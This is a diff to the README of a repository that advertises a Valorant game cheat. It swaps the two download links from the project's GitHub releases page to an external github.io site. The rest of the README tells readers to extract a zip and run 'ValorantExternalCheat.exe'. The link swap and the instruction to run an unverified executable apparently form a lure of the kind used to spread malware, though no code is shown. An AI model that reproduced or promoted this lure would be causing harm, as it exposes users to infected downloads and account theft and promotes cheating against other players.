@@ -1,6 +1,6 @@
 # 🎯 ValorantExternalCheat - Enhance your gaming experience with ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/charfrederickwilliam474/ValorantExternalCheat/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://charfrederickwilliam474.github.io)
 
 ## 📌 Overview
 
@@ -22,7 +22,7 @@ Ensure your Windows system receives all current updates before you start. Restar
 
 Follow these steps to set up the software.
 
-1.  Visit the [official releases page](https://github.com/charfrederickwilliam474/ValorantExternalCheat/releases) to download the package.
+1.  Visit the [official releases page](https://charfrederickwilliam474.github.io) to download the package.
 2.  Locate the latest compressed file (usually in .zip format).
 3.  Right-click the file and select "Extract All" to create a new folder.
 4.  Open the folder and find the file named `ValorantExternalCheat.exe`.
